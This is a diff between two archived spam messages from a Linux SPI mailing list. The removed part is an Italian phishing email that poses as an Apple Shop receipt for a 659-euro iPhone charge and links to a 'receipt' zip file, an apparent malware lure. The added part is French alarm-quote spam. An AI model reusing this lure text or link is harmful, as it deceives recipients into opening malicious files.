@@ -1,9 +1,11 @@
-From: comprare.ora-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org
-Subject: ATTENZIONE: Ricevuta del pagamento N.0312 in allegato
-Date: 4 Mar 2012 21:21:41 -0000
-Message-ID: <20120304212141.13823.qmail@ns384334.ovh.net>
+From: Votre expert protection par Planduweb <contact-Q4NLnoQxMXk@public.gmane.org>
+Subject: Votre devis alarme est disponible
+Date: Mon, 05 Mar 2012 20:26:54 +0100
+Message-ID: <1330975614.4f55137e790ef@mc10.fr>
+Reply-To: contact-Q4NLnoQxMXk@public.gmane.org
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="1330896101SPB"
+Content-Type: text/plain; charset="iso-8859-15"
+Content-Transfer-Encoding: quoted-printable
 To: spi-devel-general-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
 Return-path: <spi-devel-general-bounces-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org>
 List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/spi-devel-general>,
@@ -16,44 +18,20 @@ List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/spi-devel-general>
 Errors-To: spi-devel-general-bounces-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
 List-Id: linux-spi.vger.kernel.org
 
+Pour voir le message, veuillez utiliser un lecteur de mail compatible HTML
+
+Lien miroir : http://m10-fr.com/mc10_m/YT0xMyZiPTczMzMmYz00ODM2MTImZD0yMDEy=
+LTAzLTA1IDIwOjIwOjAxJmU9MSZoPTczMzImZj03MzMzJmc9NzMzMw=3D=3D
+
+Lien de d=E9sinscription : http://m10-fr.com/mc10_unsub/YT0xMyZiPTczMzMmYz0=
+0ODM2MTImZD0yMDEyLTAzLTA1IDIwOjIwOjAxJmU9MSZoPTczMzImZj03MzMzJmc9NzMzMw=3D=
+=3D
 
 
-
-
---1330896101SPB
-
-Content-type: text/html; charset="windows-1251"
-
-Content-Transfer-Encoding: 8bit
-
-
-
-<B><font color=#4F81D6 size=5>AVVISO DI RICEVUTO PAGAMENTO N.0312:</font></B><BR><TR><TD><HR><BR>Gentile cliente, <BR>abbiamo ricevuto il pagamento della somma di 659,00 Euro con la sua carta di credito come da accordi per un acquisto di, <BR>N.1 (uno) iPhone 4S, Chip dual-core A5, fotocamera da 8 MP totalmente rinnovata, iOS 5 e iCloud.<BR>Il suo acquisto le sara recapitato al suo indirizzo che ci ha fornito al momento della registrazione.<BR>Il suo documento di ricevuta per la stampa N.0312 del pagamento online lo trova in allegato qui <a href=http://soloperte.clanteam.com/Documento0312.rtf.zip>Ricevuta 0312</a>.<BR><BR>Distinti saluti.<BR><BR><b><FONT COLOR=#7288C4>Ufficio Fatture Apple Shop S.r.l.<BR>Via Martiri Caduti, 24, (88100) <BR>E-mail: guidapierluigi-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org<BR></FONT><BR></b
- ><CENTER><img src=http://www.credit-card-logos.com/images/multiple_credit-card-logos-1/credit_card_logos_9.gif></CENTER><HR><BR>
-
-
-
-
---1330896101SPB
-Content-Type: text/plain; charset="us-ascii"
-MIME-Version: 1.0
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline
-
-------------------------------------------------------------------------------
-Virtualization & Cloud Management Using Capacity Planning
-Cloud computing makes use of virtualization - but cloud computing 
-also focuses on allowing computing to be delivered as a service.
-http://www.accelacomm.com/jaw/sfnl/114/51521223/
---1330896101SPB
-Content-Type: text/plain; charset="us-ascii"
-MIME-Version: 1.0
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline
-
-_______________________________________________
-spi-devel-general mailing list
-spi-devel-general-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
-https://lists.sourceforge.net/lists/listinfo/spi-devel-general
-
---1330896101SPB--
+---------------------------------------------------------------------------=
+---
+Try before you buy =3D See our experts in action!
+The most comprehensive online learning library for Microsoft developers
+is just $99.99! Visual Studio, SharePoint, SQL - plus HTML5, CSS3, MVC3,
+Metro Style Apps, more. Free future releases when you subscribe now!
+http://p.sf.net/sfu/learndevnow-dev2
